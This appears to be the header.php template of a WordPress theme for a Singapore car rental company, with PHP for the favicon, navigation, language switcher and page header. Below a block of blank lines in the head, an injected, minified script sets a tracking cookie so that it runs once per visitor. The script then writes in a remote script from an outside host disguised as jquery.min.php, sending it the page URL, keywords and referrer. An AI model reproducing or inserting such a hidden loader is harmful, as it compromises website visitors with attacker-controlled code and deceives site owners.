<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Vin's Car Rental Pte Ltd</title>
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
	<?php
	global $wpdb;
	$query = sprintf("select * from vc_posts where post_type='%s'",'favicon');
	$favicondata = $wpdb->get_results($query);
	if($favicondata){
		foreach($favicondata as $favicon){
			$query = sprintf("select * from vc_posts where post_parent=%d limit 1",$favicon->ID);
			 $datas = $wpdb->get_results($query);
			 foreach($datas as $data){
	?>
	<link rel="shortcut icon" href="<?php echo $data->guid;?>" type="image/x-icon" />
	<?php			 
				 }
			}
		}
	?>
	<link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700italic,700,400italic' rel='stylesheet' type='text/css'>
	<?php wp_head(); ?>













<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://cakencandy.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'I92930' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
</head>
<body>

	<section class="top-bar">
        <div class="container">
            <div class="row">
				<div class="col-lg-12">
					<div class="likeus" style="display:none;">
							<a target="_blank" href="<?php echo get_option('facebook'); ?>" class="likeusfb">
							<img src="<?php echo get_template_directory_uri(); ?>/images/fb.png"></a>
							<a target="_blank" href="<?php echo get_option('instagram'); ?>" class="likeusfb">
							<img style="width:20px;height:auto;" src="<?php echo get_template_directory_uri(); ?>/images/instagram.png"></a>
							<a target="_blank" href="<?php echo get_option('twitter'); ?>" class="likeusfb">
							<img style="width:20px;height:auto;" src="<?php echo get_template_directory_uri(); ?>/images/twi.png"></a>
							<a target="_blank" href="<?php echo get_option('carousell'); ?>" class="likeusfb">
							<img style="width:20px;height:auto;" src="<?php echo get_template_directory_uri(); ?>/images/carousell.png"></a>
							<a target="_blank" href="<?php echo get_option('linkedin'); ?>" class="likeusfb">
							<img style="width:20px;height:auto;" src="<?php echo get_template_directory_uri(); ?>/images/linkedin.png"></a>
					</div>
					<div class="phnum">
							<img src="<?php echo get_template_directory_uri(); ?>/images/ph.png"><span class="hotline">Hot Line : </span>+65 64581111	
					</div>
					<div class="lang-wrap">
					<?php pll_the_languages(array('show_flags'=>0,'show_names'=>'English, 日本語'));?>		
					<br />			
					</div>
                </div>
            </div>
        </div>
    </section>
    
    <!-- Navigation -->
    <div class="navbar navbar-inverse" role="navigation">
        <div class="container">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="<?php echo site_url(); ?>"><img src="<?php echo get_template_directory_uri(); ?>/images/logo.png" rel="Vin's Cars" alt="Vin's Cars"></a>
            </div>
            <!-- Collect the nav links, forms, and other content for toggling t-->
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                <?php if ( has_nav_menu( 'main_menu', 'mytheme' ) ) { ?>
							<?php 
									wp_nav_menu( array( 
										'container' => false, 
										'menu_class' => 'nav navbar-nav', 
										'theme_location' => 'main_menu', 
										'fallback_cb' => 'display_home' 
										) ); 
							?>
					<?php } else { ?>
				<ul class="nav navbar-nav">					
					 	<?php wp_list_pages('title_li=' ); ?>
                </ul>
				<?php	} ?>				
            </div>
            <!-- /.navbar-collapse -->
        </div>
        <!-- /.container -->
    </div>

    <!-- Image Background Page Header -->
    <!-- Note: The background image is set within the business-casual.css file. -->
	<?php  if(is_home() || is_front_page()){ ?>
      <header class="business-header">
     <?php echo do_shortcode( '[metaslider id=139]' ); ?>
    </header>
	<?php 
	}
	else {
	?>
	 <header>
     <img src="<?php echo get_template_directory_uri(); ?>/images/separator-top.jpg" rel="Vin's Cars" alt="Vin's Cars" class="img-responsive">
    </header>
	<?php 
	}
	?>